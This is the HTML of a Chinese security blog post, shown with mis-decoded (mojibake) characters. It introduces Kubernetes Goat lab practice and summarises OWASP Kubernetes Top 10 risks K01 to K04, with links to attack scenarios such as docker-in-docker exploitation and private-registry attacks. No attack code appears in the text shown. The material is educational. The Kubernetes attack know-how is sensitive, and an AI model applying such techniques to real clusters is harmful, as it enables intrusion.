<!DOCTYPE HTML>
<html lang="zh-CN">


<head>
    <meta charset="utf-8">
    <meta name="keywords" content="k8säº‘åŸç”Ÿå®‰å…¨æ”»é˜²å®è·µ, Hackerè¿›åŒ–è®º">
    <meta name="description" content="æœ¬æ–‡ä¸»è¦ä»‹ç»k8säº‘åŸç”Ÿå®‰å…¨æ”»é˜²å®è·µç›¸å…³å†…å®¹">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="renderer" content="webkit|ie-stand|ie-comp">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="format-detection" content="telephone=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <meta name="referrer" content="no-referrer-when-downgrade">
    <!-- Global site tag (gtag.js) - Google Analytics -->


    <title>k8säº‘åŸç”Ÿå®‰å…¨æ”»é˜²å®è·µ | Hackerè¿›åŒ–è®º</title>
    <link rel="icon" type="image/png" href="/hacker1.png">
    


    <!-- bg-cover style     -->



<link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
<link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
<link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
<link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
<link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
<link rel="stylesheet" type="text/css" href="/css/matery.css">
<link rel="stylesheet" type="text/css" href="/css/my.css">
<link rel="stylesheet" type="text/css" href="/css/dark.css" media="none" onload="if(media!='all')media='all'">




    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
    <link rel="stylesheet" href="/css/post.css">




    
        <link rel="stylesheet" type="text/css" href="/css/reward.css">
    



    <script src="/libs/jquery/jquery-3.6.0.min.js"></script>

<meta name="generator" content="Hexo 7.3.0">
<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
<link rel="alternate" href="/atom.xml" title="Hackerè¿›åŒ–è®º" type="application/atom+xml">
</head>


<body>
    <header class="navbar-fixed">
    <nav id="headNav" class="bg-color nav-transparent">
        <div id="navContainer" class="nav-wrapper container">
            <div class="brand-logo">
                <a href="/" class="waves-effect waves-light">
                    
                    <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/medias/incognito.png" class="logo-img" alt="LOGO">
                    
                    <span class="logo-span">Hackerè¿›åŒ–è®º</span>
                </a>
            </div>
            

<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
<ul class="right nav-menu">
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/" class="waves-effect waves-light">
      
      <i class="fas fa-home" style="zoom: 0.6;"></i>
      
      <span>é¦–é¡µ</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/tags" class="waves-effect waves-light">
      
      <i class="fas fa-tags" style="zoom: 0.6;"></i>
      
      <span>æ ‡ç­¾</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/categories" class="waves-effect waves-light">
      
      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
      
      <span>åˆ†ç±»</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/archives" class="waves-effect waves-light">
      
      <i class="fas fa-archive" style="zoom: 0.6;"></i>
      
      <span>å½’æ¡£</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/about" class="waves-effect waves-light">
      
      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
      
      <span>å…³äº</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/contact" class="waves-effect waves-light">
      
      <i class="fas fa-comments" style="zoom: 0.6;"></i>
      
      <span>ç•™è¨€æ¿</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/friends" class="waves-effect waves-light">
      
      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
      
      <span>å‹æƒ…é“¾æ¥</span>
    </a>
    
  </li>
  
  <li>
    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
      <i id="searchIcon" class="fas fa-search" title="æœç´¢" style="zoom: 0.85;"></i>
    </a>
  </li>
  <li>
    <a href="javascript:;" class="waves-effect waves-light" onclick="switchNightMode()" title="æ·±è‰²/æµ…è‰²æ¨¡å¼" >
      <i id="sum-moon-icon" class="fas fa-sun" style="zoom: 0.85;"></i>
    </a>
  </li>
</ul>


<div id="mobile-nav" class="side-nav sidenav">

    <div class="mobile-head bg-color">
        
        <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/medias/incognito.png" class="logo-img circle responsive-img">
        
        <div class="logo-name">Hackerè¿›åŒ–è®º</div>
        <div class="logo-desc">
            
            The only way to do great work is to love what you do.
            
        </div>
    </div>

    <ul class="menu-list mobile-menu-list">
        
        <li class="m-nav-item">
	  
		<a href="/" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-home"></i>
			
			é¦–é¡µ
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/tags" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-tags"></i>
			
			æ ‡ç­¾
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/categories" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-bookmark"></i>
			
			åˆ†ç±»
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/archives" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-archive"></i>
			
			å½’æ¡£
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/about" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-user-circle"></i>
			
			å…³äº
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/contact" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-comments"></i>
			
			ç•™è¨€æ¿
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/friends" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-address-book"></i>
			
			å‹æƒ…é“¾æ¥
		</a>
          
        </li>
        
        
        <li><div class="divider"></div></li>
        <li>
            <a href="https://github.com/si-xiao-kai/si-xiao-kai.github.io" class="waves-effect waves-light" target="_blank">
                <i class="fab fa-github-square fa-fw"></i>Fork Me
            </a>
        </li>
        
    </ul>
</div>


        </div>

        
            <style>
    .nav-transparent .github-corner {
        display: none !important;
    }

    .github-corner {
        position: absolute;
        z-index: 10;
        top: 0;
        right: 0;
        border: 0;
        transform: scale(1.1);
    }

    .github-corner svg {
        color: #0f9d58;
        fill: #fff;
        height: 64px;
        width: 64px;
    }

    .github-corner:hover .octo-arm {
        animation: a 0.56s ease-in-out;
    }

    .github-corner .octo-arm {
        animation: none;
    }

    @keyframes a {
        0%,
        to {
            transform: rotate(0);
        }
        20%,
        60% {
            transform: rotate(-25deg);
        }
        40%,
        80% {
            transform: rotate(10deg);
        }
    }
</style>

<a href="https://github.com/si-xiao-kai/si-xiao-kai.github.io" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
   data-tooltip="Fork Me" data-position="left" data-delay="50">
    <svg viewBox="0 0 250 250" aria-hidden="true">
        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
              fill="currentColor" class="octo-body"></path>
    </svg>
</a>
        
    </nav>

</header>

    



<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/8.jpg')">
    <div class="container" style="right: 0px;left: 0px;">
        <div class="row">
            <div class="col s12 m12 l12">
                <div class="brand">
                    <h1 class="description center-align post-title">k8säº‘åŸç”Ÿå®‰å…¨æ”»é˜²å®è·µ</h1>
                </div>
            </div>
        </div>
    </div>
</div>




<main class="post-container content">

    
    <div class="row">
    <div id="main-content" class="col s12 m12 l9">
        <!-- æ–‡ç« å†…å®¹è¯¦æƒ… -->
<div id="artDetail">
    <div class="card">
        <div class="card-content article-info">
            <div class="row tag-cate">
                <div class="col s7">
                    
                    <div class="article-tag">
                        
                            <a href="/tags/%E4%BA%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/">
                                <span class="chip bg-color">äº‘å®‰å…¨æ”»é˜²</span>
                            </a>
                        
                            <a href="/tags/%E4%BA%91%E5%8E%9F%E7%94%9F%E5%AE%89%E5%85%A8/">
                                <span class="chip bg-color">äº‘åŸç”Ÿå®‰å…¨</span>
                            </a>
                        
                            <a href="/tags/k8s%E6%94%BB%E9%98%B2/">
                                <span class="chip bg-color">k8sæ”»é˜²</span>
                            </a>
                        
                            <a href="/tags/KubernetesGoat%E9%9D%B6%E5%9C%BA/">
                                <span class="chip bg-color">KubernetesGoaté¶åœº</span>
                            </a>
                        
                    </div>
                    
                </div>
                <div class="col s5 right-align">
                    
                    <div class="post-cate">
                        <i class="fas fa-bookmark fa-fw icon-category"></i>
                        
                            <a href="/categories/%E4%BA%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/" class="post-category">
                                äº‘å®‰å…¨æ”»é˜²
                            </a>
                        
                    </div>
                    
                </div>
            </div>

            <div class="post-info">
                
                <div class="post-date info-break-policy">
                    <i class="far fa-calendar-minus fa-fw"></i>å‘å¸ƒæ—¥æœŸ:&nbsp;&nbsp;
                    2025-05-07
                </div>
                

                
                <div class="post-date info-break-policy">
                    <i class="far fa-calendar-check fa-fw"></i>æ›´æ–°æ—¥æœŸ:&nbsp;&nbsp;
                    2025-05-23
                </div>
                

                
                <div class="info-break-policy">
                    <i class="far fa-file-word fa-fw"></i>æ–‡ç« å­—æ•°:&nbsp;&nbsp;
                    17.1k
                </div>
                

                
                <div class="info-break-policy">
                    <i class="far fa-clock fa-fw"></i>é˜…è¯»æ—¶é•¿:&nbsp;&nbsp;
                    69 åˆ†
                </div>
                

                
                    <div id="busuanzi_container_page_pv" class="info-break-policy">
                        <i class="far fa-eye fa-fw"></i>é˜…è¯»æ¬¡æ•°:&nbsp;&nbsp;
                        <span id="busuanzi_value_page_pv"></span>
                    </div>
				
            </div>
        </div>
        <hr class="clearfix">

        
        <!-- æ˜¯å¦åŠ è½½ä½¿ç”¨è‡ªå¸¦çš„ prismjs. -->
        <link rel="stylesheet" href="/libs/prism/prism.min.css">
        

        

        <div class="card-content article-card-content">
            <div id="articleContent">
                <p>åœ¨ã€Šäº‘å®‰å…¨æ”»é˜²å…¥é—¨ã€‹ä¸€æ–‡ä¸­ï¼Œä¸»è¦ä»‹ç»äº†äº‘è®¡ç®—çš„åŸºæœ¬æ¦‚å¿µä»¥åŠäº‘åŸç”Ÿç›¸å…³çš„åŸºç¡€çŸ¥è¯†ï¼Œåœ¨ã€Šk8säº‘åŸç”Ÿæ”»é˜²é¶åœºã€‹ ä¸€æ–‡ä¸»è¦ä»‹ç»äº†k8säº‘åŸç”Ÿæ”»é˜²ç›¸å…³é¶åœºå’Œæ­å»ºæ–¹æ³•ã€‚</p>
<p>æœ¬æ–‡ä¸»è¦åŸºäºKubernetesGoaté¶åœºå¼€å±•äº‘åŸç”Ÿå®‰å…¨çš„ç ”ç©¶åŠç›¸å…³å®è·µã€‚</p>
<h1 id="ä¸€ã€OWASP-Kubernetes-Top-10"><a href="#ä¸€ã€OWASP-Kubernetes-Top-10" class="headerlink" title="ä¸€ã€OWASP Kubernetes Top 10"></a>ä¸€ã€OWASP Kubernetes Top 10</h1><img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/05/07/yun-an-quan-gong-fang/k8s-yun-yuan-sheng-an-quan-gong-fang-shi-jian/%E6%88%AA%E5%B1%8F2025-05-07%2013.56.20.png" style="zoom:50%;">

<p>OWASP Kubernetesåå¤§å®‰å…¨é£é™©æ¡†æ¶æ˜¯ä¸€å¥—ä¸“ä¸ºå®‰å…¨ä»ä¸šè€…ã€ç³»ç»Ÿç®¡ç†å‘˜å’Œè½¯ä»¶å¼€å‘äººå‘˜è®¾è®¡çš„æŒ‡å—ï¼Œæ—¨åœ¨å¸®åŠ©è¯†åˆ«å’Œä¼˜å…ˆå¤„ç†Kubernetesç”Ÿæ€ç³»ç»Ÿä¸­ç‰¹æœ‰çš„å®‰å…¨å¨èƒã€‚è¯¥åå¤§é£é™©æ¸…å•æä¾›äº†ä¸€ä¸ªç»è¿‡ä¼˜å…ˆçº§æ’åºçš„å…¨é¢å®‰å…¨é£é™©é›†åˆï¼Œé€šè¿‡è§£å†³è¿™äº›å…³é”®é£é™©ï¼Œèƒ½å¤Ÿæœ‰æ•ˆä¿éšœåº”ç”¨å’ŒåŸºç¡€è®¾æ–½çš„å®‰å…¨æ€§ä¸ç¨³å®šæ€§ã€‚éµå¾ªOWASP Kubernetesåå¤§å®‰å…¨é£é™©æ¡†æ¶çš„æŒ‡å¯¼åŸåˆ™ï¼Œç»„ç»‡å¯ä»¥æ›´å¥½åœ°ä¿æŠ¤å…¶ç³»ç»Ÿå®‰å…¨ï¼Œé˜²èŒƒæ½œåœ¨çš„å®‰å…¨æ¼æ´ã€‚</p>
<p>OWASP Kubernetesåå¤§å®‰å…¨é£é™©æ¡†æ¶ä¸Kubernetes Goatæ˜¯ç»ä½³çš„æ­é…ï¼Œè¯¥æ¡†æ¶å®Œæ•´åˆ—å‡ºäº†Kubernetesé›†ç¾¤ä¸­æœ€å…³é”®çš„å®‰å…¨é£é™©æ¸…å•ã€‚é€šè¿‡å°†OWASPæ¡†æ¶çš„çŸ¥è¯†ç‚¹åº”ç”¨åˆ°Kubernetes Goatå®éªŒç¯å¢ƒä¸­ï¼Œç”¨æˆ·èƒ½å¤Ÿé€šè¿‡å®æˆ˜æ¼”ç»ƒæŒæ¡è¯†åˆ«å’Œä¿®å¤æ½œåœ¨å®‰å…¨æ¼æ´çš„å®è·µæŠ€èƒ½ã€‚</p>
<h2 id="1-1-K01-Insecure-Workload-Configurations"><a href="#1-1-K01-Insecure-Workload-Configurations" class="headerlink" title="1.1 K01 - Insecure Workload Configurations"></a>1.1 K01 - Insecure Workload Configurations</h2><p>Kubernetes æ¸…å•åŒ…å«å½±å“å·¥ä½œè´Ÿè½½å¯é æ€§ã€å®‰å…¨æ€§å’Œå¯æ‰©å±•æ€§çš„é…ç½®ã€‚å®šæœŸå®¡è®¡å’Œä¿®å¤éå¸¸é‡è¦ã€‚</p>
<p>å…·æœ‰é«˜å½±å“çš„é…ç½®åŒ…æ‹¬ï¼š</p>
<ul>
<li><p>åº”ç”¨ç¨‹åºè¿›ç¨‹ä¸åº”ä»¥ root èº«ä»½è¿è¡Œ</p>
</li>
<li><p>åº”ä½¿ç”¨åªè¯»æ–‡ä»¶ç³»ç»Ÿ</p>
</li>
<li><p>åº”ç¦æ­¢ç‰¹æƒå®¹å™¨</p>
</li>
</ul>
<p>ç›¸å…³goatåœºæ™¯</p>
<ul>
<li><p><a target="_blank" rel="noopener" href="https://madhuakula.com/kubernetes-goat/docs/scenarios/scenario-2/docker-in-docker-exploitation-in-kubernetes-containers/welcome">DIND (docker-in-docker) exploitation</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://madhuakula.com/kubernetes-goat/docs/scenarios/scenario-13/denial-of-service-memory-and-cpu-resources-in-kubernetes-cluster/welcome">DoS the Memory/CPU resources</a></p>
</li>
</ul>
<p>å‚è€ƒï¼š<a target="_blank" rel="noopener" href="https://owasp.org/www-project-kubernetes-top-ten/2022/en/src/K01-insecure-workload-configurations">https://owasp.org/www-project-kubernetes-top-ten/2022/en/src/K01-insecure-workload-configurations</a></p>
<h2 id="1-2-K02-Supply-Chain-Vulnerabilities"><a href="#1-2-K02-Supply-Chain-Vulnerabilities" class="headerlink" title="1.2 K02 - Supply Chain Vulnerabilities"></a>1.2 K02 - Supply Chain Vulnerabilities</h2><p>å®¹å™¨åœ¨å¼€å‘ç”Ÿå‘½å‘¨æœŸä¾›åº”é“¾ä¸­å‘æŒ¥ç€è‡³å…³é‡è¦çš„ä½œç”¨ï¼Œå¹¶åœ¨å„ä¸ªé˜¶æ®µä»¥ä¸åŒå½¢å¼å­˜åœ¨ã€‚ç”±äºæ¯ä¸ªå®¹å™¨å¯èƒ½ä¾èµ–äºæ•°ç™¾ä¸ªç¬¬ä¸‰æ–¹ç»„ä»¶å’Œä¾èµ–é¡¹ï¼Œå› æ­¤æ¯ä¸ªå®¹å™¨éƒ½å‘ˆç°å‡ºç‹¬ç‰¹çš„å®‰å…¨æŒ‘æˆ˜ï¼Œè¿™ä½¿å¾—åœ¨æ¯ä¸ªé˜¶æ®µå»ºç«‹ä¿¡ä»»å˜å¾—å›°éš¾ã€‚</p>
<p>å®¹å™¨å¸¦æ¥çš„ä¸»è¦å®‰å…¨æŒ‘æˆ˜åŒ…æ‹¬ä½†ä¸é™äºä»¥ä¸‹å‡ ç‚¹ï¼š</p>
<ul>
<li>é•œåƒå®Œæ•´æ€§ï¼šç¡®ä¿å®¹å™¨é•œåƒæœªå—åˆ°æœªç»æˆæƒæˆ–æ¶æ„çš„ä¿®æ”¹ã€‚</li>
<li>é•œåƒç»„æˆï¼šè¯†åˆ«å¹¶éªŒè¯å®¹å™¨é•œåƒä¸­åŒ…å«çš„æ‰€æœ‰ç»„ä»¶å’Œä¾èµ–é¡¹ã€‚</li>
<li>å·²çŸ¥è½¯ä»¶æ¼æ´ï¼šå‡è½»å®¹å™¨é•œåƒä¸­ä½¿ç”¨çš„è½¯ä»¶ç»„ä»¶æ‰€å‘ç°çš„æ¼æ´æ‰€å¸¦æ¥çš„é£é™©ã€‚</li>
</ul>
<p>ç›¸å…³goatåœºæ™¯ï¼š</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://madhuakula.com/kubernetes-goat/docs/scenarios/scenario-7/attacking-private-container-registry-in-kubernetes/welcome">Attacking private registry</a></li>
</ul>
<p>å‚è€ƒï¼š<a target="_blank" rel="noopener" href="https://owasp.org/www-project-kubernetes-top-ten/2022/en/src/K02-supply-chain-vulnerabilities">https://owasp.org/www-project-kubernetes-top-ten/2022/en/src/K02-supply-chain-vulnerabilities</a></p>
<h2 id="1-3-K03-Overly-Permissive-RBAC"><a href="#1-3-K03-Overly-Permissive-RBAC" class="headerlink" title="1.3 K03 - Overly Permissive RBAC"></a>1.3 K03 - Overly Permissive RBAC</h2><p>åŸºäºè§’è‰²çš„è®¿é—®æ§åˆ¶ï¼ˆRBACï¼‰æ˜¯ Kubernetes ä¸­çš„ä¸»è¦æˆæƒæœºåˆ¶ï¼Œç”¨äºä¸ºèµ„æºæä¾›æƒé™ã€‚RBAC æƒé™å°†åŠ¨è¯ï¼ˆå¦‚è·å–ã€åˆ›å»ºã€åˆ é™¤ç­‰ï¼‰ä¸èµ„æºï¼ˆå¦‚ Podã€æœåŠ¡å’ŒèŠ‚ç‚¹ï¼‰ç›¸ç»“åˆã€‚è¿™äº›æƒé™å¯ä»¥æ˜¯å‘½åç©ºé—´ä½œç”¨åŸŸæˆ–é›†ç¾¤ä½œç”¨åŸŸçš„ã€‚</p>
<p>ç›¸å…³goatåœºæ™¯ï¼š</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://madhuakula.com/kubernetes-goat/docs/scenarios/scenario-16/rbac-least-privileges-misconfiguration-in-kubernetes-cluster/welcome">RBAC least privileges misconfiguration</a></li>
</ul>
<p>å‚è€ƒï¼š<a target="_blank" rel="noopener" href="https://owasp.org/www-project-kubernetes-top-ten/2022/en/src/K03-overly-permissive-rbac">https://owasp.org/www-project-kubernetes-top-ten/2022/en/src/K03-overly-permissive-rbac</a></p>
<h2 id="1-4-K04-Lack-of-Centralized-Policy-Enforcement"><a href="#1-4-K04-Lack-of-Centralized-Policy-Enforcement" class="headerlink" title="1.4 K04 - Lack of Centralized Policy Enforcement"></a>1.4 K04 - Lack of Centralized Policy Enforcement</h2><p>è·¨å¤šä¸ªKubernetesé›†ç¾¤å’Œç¯å¢ƒç®¡ç†å®‰å…¨ç­–ç•¥å¯èƒ½å…·æœ‰æŒ‘æˆ˜æ€§ã€‚å¦‚æœæ²¡æœ‰ä¸€ä¸ªé›†ä¸­åŒ–çš„ä½ç½®æ¥æ£€æµ‹ã€ä¿®å¤å’Œé˜²æ­¢é…ç½®é”™è¯¯ï¼Œé›†ç¾¤å¯èƒ½ä¼šé¢ä¸´è¢«æ”»ç ´çš„é£é™©ã€‚ä¸ºäº†ç¡®ä¿ä¸€è‡´çš„å®‰å…¨æ€åŠ¿ï¼Œåº”åœ¨è½¯ä»¶äº¤ä»˜ç”Ÿå‘½å‘¨æœŸçš„å„ä¸ªé˜¶æ®µå®æ–½ç­–ç•¥å¼ºåˆ¶æ‰§è¡Œã€‚</p>
<p>è¿™åŒ…æ‹¬åœ¨æ„å»ºé˜¶æ®µåº”ç”¨ç­–ç•¥ä»¥ç¡®ä¿å®¹å™¨é•œåƒç¬¦åˆå®‰å…¨è¦æ±‚ï¼Œåœ¨éƒ¨ç½²é˜¶æ®µéªŒè¯åº”ç”¨ç¨‹åºçš„æœŸæœ›çŠ¶æ€æ˜¯å¦ç¬¦åˆå®‰å…¨ç­–ç•¥ï¼Œä»¥åŠåœ¨è¿è¡Œæ—¶æŒç»­ç¡®ä¿åˆè§„æ€§ã€‚é€šè¿‡åœ¨ä»¥ä¸Šå„é˜¶æ®µå®æ–½ç­–ç•¥æ‰§è¡Œï¼Œç»„ç»‡èƒ½å¤Ÿç¡®ä¿ Kubernetes å·¥ä½œè´Ÿè½½åœ¨æ‰€æœ‰é›†ç¾¤å’Œç¯å¢ƒä¸­çš„å®‰å…¨æ€§ä¸åˆè§„æ€§ã€‚è¿™ç§æ–¹æ³•ä¸ºè·¨å¤šé›†ç¾¤/å¤šäº‘åŸºç¡€è®¾æ–½åº”ç”¨æ²»ç†ã€åˆè§„æ€§å’Œå®‰å…¨è¦æ±‚æä¾›äº†ä¸€ç§é€”å¾„ï¼Œè€Œä¸ä¼šå› éš¾ä»¥ç®¡ç†çš„å¤æ‚æ€§è®©å®‰å…¨å›¢é˜Ÿä¸å ªé‡è´Ÿã€‚</p>
<p>ç›¸å…³goatåœºæ™¯ï¼š</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://madhuakula.com/kubernetes-goat/docs/scenarios/scenario-22/securing-kubernetes-clusters-using-kyverno-policy-engine/welcome">Securing Kubernetes Clusters using Kyverno Policy Engine</a></li>
</ul>
<p>å‚è€ƒï¼š<a target="_blank" rel="noopener" href="https://owasp.org/www-project-kubernetes-top-ten/2022/en/src/K04-policy-enforcement">https://owasp.org/www-project-kubernetes-top-ten/2022/en/src/K04-policy-enforcement</a></p>
